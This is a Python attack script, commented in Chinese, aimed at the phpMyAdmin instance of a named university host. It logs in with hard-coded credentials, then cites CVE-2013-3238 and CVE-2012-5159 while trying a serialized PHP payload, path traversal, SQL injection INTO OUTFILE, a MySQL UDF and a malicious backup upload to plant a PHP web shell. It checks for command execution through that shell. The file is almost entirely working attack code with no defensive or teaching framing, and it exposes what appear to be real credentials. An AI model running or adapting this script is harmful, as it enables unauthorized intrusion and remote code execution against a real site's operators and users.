#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text)
if not token:
    print("[-] 登录失败")
    exit(1)
token = token.group(1)

print(f"[+] Token: {token}")

# CVE-2013-3238: 反序列化漏洞
print("[*] 尝试CVE-2013-3238反序列化漏洞...")

# 构造恶意序列化数据
malicious_payload = 'O:8:"stdClass":1:{s:4:"test";s:10:"<?php system($_GET[\'c\']); ?>";}'

# 尝试通过多个入口点
exploit_paths = [
    ("index.php", {"target": "db_sql.php%253f/../../../../../../../../tmp/shell.php", "pma_servername": malicious_payload}),
    ("import.php", {"target": "../../../../tmp/shell.php", "pma_servername": malicious_payload}),
    ("server_import.php", {"target": "../../../../tmp/shell.php", "pma_servername": malicious_payload}),
]

for path, params in exploit_paths:
    params["token"] = token
    resp = session.get(url + path, params=params, verify=False, timeout=5)
    if resp.status_code == 200:
        print(f"[*] {path} 响应正常")

# CVE-2012-5159: SQL注入
print("[*] 尝试SQL注入...")
sql_inj = "1' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
sql_data = {"sql_query": sql_inj, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 检查shell
test_shell = requests.get("https://olympic.su.ac.th/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print("[+] Shell获取成功: https://olympic.su.ac.th/shell.php?c=id")
    exit(0)

# 尝试通过用户权限提升
print("[*] 尝试创建文件写入函数...")
sql = """
CREATE FUNCTION shell_write RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT shell_write('<?php system($_GET[c]); ?>', '/var/www/html/shell.php');
"""
# 如果UDF不可用，尝试其他方法

print("[*] 尝试通过phpMyAdmin临时文件...")
# phpMyAdmin可能创建临时文件，尝试控制
import_data = {
    "import_type": "sql",
    "sql_query": "SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
}

print("[*] 尝试通过数据库备份恢复...")
# 创建备份文件，包含shell代码
backup_content = "-- MySQL dump\nSELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
files = {"import_file": ("backup.sql", backup_content, "application/sql")}
data = {"format": "sql", "token": token}
resp = session.post(url + "import.php", files=files, data=data, verify=False, timeout=5)

test_shell = requests.get("https://olympic.su.ac.th/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print("[+] 通过备份恢复获取shell成功")
    exit(0)
